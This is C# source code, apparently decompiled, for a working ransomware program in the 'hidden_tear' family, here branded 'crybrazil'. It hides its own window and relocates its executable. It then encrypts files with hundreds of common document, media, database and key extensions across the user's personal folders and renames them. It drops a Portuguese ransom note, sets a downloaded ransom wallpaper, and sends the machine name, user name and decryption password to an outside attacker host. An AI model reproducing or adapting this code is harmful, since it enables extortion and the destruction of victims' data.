using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace hidden_tear;

public class Form1 : Form
{
	private string targetURL = "http://3e24c23r2213122c1cxdsxsd.unaux.com/crybrazil/write.php?info=";

	private string userName = Environment.UserName;

	private string computerName = Environment.MachineName.ToString();

	private string userDir = "C:\\";

	private string backgroundImageUrl = "http://4.bp.blogspot.com/-11m8rWaFmWs/WuhochGTK0I/AAAAAAAAFTY/VkbbVhxYZDgW_jlbQ5lPbV8AEhyd4ihgQCK4BGAYYCw/s1600/ranso4.jpg";

	private IContainer components = null;

	protected override CreateParams CreateParams
	{
		get
		{
			CreateParams createParams = ((Form)this).get_CreateParams();
			createParams.set_ExStyle(createParams.get_ExStyle() | 0x80);
			return createParams;
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		startAction();
	}

	private void Form_Shown(object sender, EventArgs e)
	{
		((Control)this).set_Visible(false);
		((Form)this).set_Opacity(100.0);
	}

	public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] result = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		return result;
	}

	public string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=?()"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=?()".Length)]);
		}
		return stringBuilder.ToString();
	}

	public void SendPassword(string password)
	{
		try
		{
			string text = computerName + "-" + userName + " " + password;
			string address = targetURL + text;
			new WebClient().DownloadString(address);
		}
		catch (Exception)
		{
		}
	}

	public void EncryptFile(string file, string password)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = AES_Encrypt(bytesToBeEncrypted, bytes);
		string text = "Users\\";
		string text2 = text + userName + "\\Desktop\\SUA_CHAVE.html.hacked";
		string path = userDir + text2;
		if (File.Exists(path))
		{
			File.Delete(path);
		}
		File.WriteAllBytes(file, bytes2);
		File.Move(file, file + ".crybrazil");
	}

	public void encryptDirectory(string location, string password)
	{
		try
		{
			string[] source = new string[256]
			{
				".dat", ".keychain", ".sdf", ".vcf", ".jpg", ".png", ".tiff", ".tif", ".gif", ".jpeg",
				".jif", ".jfif", ".jp2", ".jpx", ".j2k", ".j2c", ".fpx", ".pcd", ".bmp", ".svg",
				".3dm", ".3ds", ".max", ".obj", ".dds", ".psd", ".tga", ".thm", ".yuv", ".ai",
				".eps", ".ps", ".indd", ".pct", ".mp4", ".avi", ".mkv", ".3g2", ".3gp", ".asf",
				".flv", ".m4v", ".mov", ".mpg", ".rm", ".srt", ".swf", ".vob", ".wmv", ".doc",
				".docx", ".txt", ".pdf", ".log", ".msg", ".odt", ".pages", ".rtf", ".tex", ".wpd",
				".wps", ".csv", ".ged", ".key", ".pps", ".ppt", ".pptx", ".xml", ".json", ".xlsx",
				".xlsm", ".xlsb", ".xls", ".mht", ".mhtml", ".htm", ".html", ".xltx", ".prn", ".dif",
				".slk", ".xlam", ".xla", ".ods", ".docm", ".dotx", ".dotm", ".xps", ".ics", ".mp3",
				".aif", ".iff", ".m3u", ".m4a", ".mid", ".mpa", ".wav", ".wma", ".msi", ".php",
				".apk", ".app", ".bat", ".cgi", ".com", ".asp", ".aspx", ".cer", ".cfm", ".css",
				".js", ".jsp", ".rss", ".xhtml", ".c", ".class", ".cpp", ".cs", ".h", ".java",
				".lua", ".pl", ".py", ".sh", ".sln", ".swift", ".vb", ".vcxproj", ".dem", ".gam",
				".nes", ".rom", ".sav", ".tgz", ".zip", ".rar", ".tar", ".7z", ".cbr", ".deb",
				".gz", ".pkg", ".rpm", ".zipx", ".iso", ".accdb", ".db", ".dbf", ".mdb", ".sql",
				".fnt", ".fon", ".otf", ".ttf", ".cfg", ".prf", ".bak", ".old", ".tmp", ".torrent",
				".der", ".pfx", ".crt", ".csr", ".p12", ".pem", ".ott", ".sxw", ".stw", ".uot",
				".ots", ".sxc", ".stc", ".wb2", ".odp", ".otp", ".sxd", ".std", ".uop", ".odg",
				".otg", ".sxm", ".mml", ".lay", ".lay6", ".asc", ".sqlite3", ".sqlitedb", ".odb", ".frm",
				".myd", ".myi", ".ibd", ".mdf", ".ldf", ".suo", ".pas", ".asm", ".cmd", ".ps1",
				".vbs", ".dip", ".dch", ".sch", ".brd", ".rb", ".jar", ".fla", ".mpeg", ".m4u",
				".djvu", ".nef", ".cgm", ".raw", ".vcd", ".backup", ".tbk", ".bz2", ".PAQ", ".aes",
				".gpg", ".vmx", ".vmdk", ".vdi", ".sldm", ".sldx", ".sti", ".sxi", ".602", ".hwp",
				".edb", ".potm", ".potx", ".ppam", ".ppsx", ".ppsm", ".pot", ".pptm", ".xltm", ".xlc",
				".xlm", ".xlt", ".xlw", ".dot", ".docb", ".snt", ".onetoc2", ".dwg", ".wk1", ".wks",
				".123", ".vsdx", ".vsd", ".eml", ".ost", ".pst"
			};
			string[] files = Directory.GetFiles(location);
			string[] directories = Directory.GetDirectories(location);
			for (int i = 0; i < files.Length; i++)
			{
				string extension = Path.GetExtension(files[i]);
				if (source.Contains(extension))
				{
					EncryptFile(files[i], password);
				}
			}
			for (int i = 0; i < directories.Length; i++)
			{
				encryptDirectory(directories[i], password);
			}
		}
		catch (Exception)
		{
		}
	}

	public void MoveVirus()
	{
		string path = userDir + userName + "\\Rand123";
		string text = userDir + userName + "\\Rand123\\local.exe";
		if (!Directory.Exists(path))
		{
			Directory.CreateDirectory(path);
		}
		else if (File.Exists(text))
		{
			File.Delete(text);
		}
		string text2 = "\\" + Process.GetCurrentProcess().ProcessName + ".exe";
		string text3 = Directory.GetCurrentDirectory() + text2;
		string sourceFileName = text3;
		File.Move(sourceFileName, text);
	}

	public static bool CheckForInternetConnection()
	{
		try
		{
			using WebClient webClient = new WebClient();
			using (webClient.OpenRead("https://www.google.fr"))
			{
				return true;
			}
		}
		catch
		{
			return false;
		}
	}

	public void startAction()
	{
		string password = "AA151257B1462D642E7E21FF9C80F83CAF043C3572D5ED59BD283D20641E3C9D";
		MoveVirus();
		Directory_Settings_Sending(password);
		messageCreator();
		string path = userDir + userName + "\\ranso4.jpg";
		bool flag;
		do
		{
			if (flag = CheckForInternetConnection())
			{
				SetWallpaperFromWeb(backgroundImageUrl, path);
				SendPassword(password);
			}
		}
		while (!flag);
		password = null;
		Application.Exit();
	}

	public void Directory_Settings_Sending(string password)
	{
		string text = "Users\\";
		string location = userDir + text + userName + "\\Desktop";
		string location2 = userDir + text + userName + "\\Documents";
		string location3 = userDir + text + userName + "\\Downloads";
		string location4 = userDir + text + userName + "\\Pictures";
		string location5 = userDir + text + userName + "\\Music";
		string location6 = userDir + text + userName + "\\Videos";
		encryptDirectory(location, password);
		encryptDirectory(location2, password);
		encryptDirectory(location3, password);
		encryptDirectory(location4, password);
		encryptDirectory(location5, password);
		encryptDirectory(location6, password);
	}

	public void messageCreator()
	{
		string text = "\\Desktop\\SUA_CHAVE.html";
		string path = userDir + "Users\\" + userName + text;
		_ = computerName + "-" + userName;
		string[] contents = new string[1] { "<a href= 'http://3e24c23r2213122c1cxdsxsd.unaux.com' target='_blank'<H3>O QUE ESTÁ ACONTECENDO?</H3></a>" };
		File.WriteAllLines(path, contents);
	}

	public void SetWallpaper(string path)
	{
		SystemParametersInfo(20u, 0u, path, 3u);
	}

	private void SetWallpaperFromWeb(string url, string path)
	{
		try
		{
			WebClient webClient = new WebClient();
			webClient.DownloadFile(new Uri(url), path);
			SetWallpaper(path);
		}
		catch (Exception)
		{
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_004d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0057: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(124, 53));
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("projet");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
